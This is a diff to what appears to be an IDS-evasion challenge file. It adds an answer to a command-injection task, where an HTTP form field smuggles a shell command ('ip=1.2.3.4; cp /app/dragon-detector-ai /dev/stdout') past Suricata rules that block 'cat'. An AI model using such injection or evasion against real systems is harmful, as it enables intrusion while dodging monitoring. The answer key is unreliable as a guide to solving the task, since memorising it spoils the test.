@@ -19,11 +19,21 @@ base_request: |-
 
   ip=1.2.3.4; cat /app/dragon-detector-ai
 
+solution: |-
+  POST /detect-dragon.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 50
+
+  ip=1.2.3.4; cp /app/dragon-detector-ai /dev/stdout
+
+solution_note: Use a tool other than `cat`
+
 rules:
 # Don't use cat
 - >
   alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; content: "cat"; sid:123456; rev:1;)
 - >
-  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; http.request_body; content: "cat"; sid:123457; rev:1;)
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; http.request_body; url_decode; content: "cat"; sid:123457; rev:1;)
 
 expected_output: "This doesn't actually do anything"
